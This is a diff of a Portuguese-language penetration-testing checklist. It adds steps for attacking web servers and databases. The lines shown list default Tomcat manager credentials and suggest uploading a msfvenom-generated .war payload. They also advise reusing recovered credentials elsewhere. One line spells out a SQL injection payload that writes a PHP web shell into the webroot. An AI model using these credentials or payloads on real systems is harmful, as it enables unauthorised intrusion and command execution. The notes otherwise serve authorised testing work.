@@ -291,6 +291,32 @@ diretório acessível (`interface` do gerenciador de arquivos, compartilhamento 
 
 1: Tente acessar `/manager`
 
-2: `Senha padrão`: `admin:admin`, `tomcat:tomcat`, `admin:NULL`, `admin:s3cr3t`, `tomcat:s3cr3t`, `admin:tomcat`
+2: Senha padrão: `admin:admin`, `tomcat:tomcat`, `admin:NULL`, `admin:s3cr3t`, `tomcat:s3cr3t`, `admin:tomcat`
 
 3: Carregar carga útil `.war`    - #Vc pode gerar usando o msfvenom ou alguma outra tool 
+
+## Nginx
+
+1: Verifique: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx
+
+## IIS
+
+1: Verifique e teste as extensões de arquivo `asp`, `aspx`, `config`, `php`
+
+2: arquivo `web.config`
+
+## Database
+
+1: `SQLi`
+
+2: `Recuperar a credencial` - #Sempre reutilize em outro lugar
+
+3: `Substituir a credencial` se o hash for `inexplorável`
+
+4: Escreva um web shell no webroot: `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE '/var/www/html/cmd.php' -- -'`
+
+## Plugin
+
+1: Exploração do plug-in vulnerável
+
+2: Habilite um `plugin específico`
